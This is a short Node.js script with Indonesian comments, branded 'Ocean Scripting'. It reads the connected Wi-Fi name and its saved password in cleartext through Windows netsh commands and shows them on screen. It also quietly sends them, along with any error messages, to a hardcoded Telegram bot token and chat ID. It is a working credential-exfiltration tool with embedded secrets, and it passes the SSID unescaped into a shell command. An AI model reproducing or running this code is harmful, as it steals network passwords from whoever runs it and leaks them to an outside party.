const { execSync } = require('child_process');
const readline = require('readline');
const fs = require('fs');
const https = require('https');

// Ganti dengan token bot Telegram Anda dan Chat ID
const TELEGRAM_BOT_TOKEN = '8412769682:AAFwyldsipYr0KxIIdJNk7g8uC7ZeyipRp0';
const CHAT_ID = '7518091428';

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = JSON.stringify({
        chat_id: CHAT_ID,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        // Response handling without logging
    });

    req.on('error', (e) => {
        console.error('Error sending to Telegram:');
    });

    req.write(data);
    req.end();
}

function centerText(text, width = 80) {
    const totalDashes = width - text.length;
    const leftDashes = Math.floor(totalDashes / 2);
    const rightDashes = totalDashes - leftDashes;
    return '-'.repeat(leftDashes) + text + '-'.repeat(rightDashes);
}

try {
    // Mendapatkan SSID Wi-Fi yang sedang terhubung
    const interfacesOutput = execSync('netsh wlan show interfaces', { encoding: 'utf8' });
    const ssidMatch = interfacesOutput.match(/SSID\s*:\s*(.+)/);

    if (!ssidMatch) {
        console.log('Tidak terhubung ke Wi-Fi.');
        sendToTelegram('Tidak terhubung ke Wi-Fi.');
    } else {
        const ssid = ssidMatch[1].trim();
        console.log(centerText('\x1b[34m [Ocean\x1b[36m Scripting] \x1b[0m'));

        console.log('\x1b[32m[Ocean]\x1b[31m Nama Wi-Fi: \x1b[0m', ssid);

        // Mendapatkan password Wi-Fi
        const profileOutput = execSync(`netsh wlan show profile name="${ssid}" key=clear`, { encoding: 'utf8' });
        const passwordMatch = profileOutput.match(/Key Content\s*:\s*(.+)/);

        let message = `Nama Wi-Fi: ${ssid}\n`;

        if (passwordMatch) {
            const password = passwordMatch[1].trim();
            console.log('\x1b[32m[Ocean]\x1b[31m Password:\x1b[0m', password);
            message += `Password: ${password}`;
        } else {
            console.log('Password tidak ditemukan atau tidak ada.');
            message += 'Password tidak ditemukan atau tidak ada.';
        }

        // Kirim informasi ke Telegram
        sendToTelegram(message);
    }
} catch (error) {
    sendToTelegram(`Error: ${error.message}`);
}

// Menunggu input pengguna sebelum keluar
rl.question('Tekan Enter untuk keluar...', () => {
    rl.close();
});
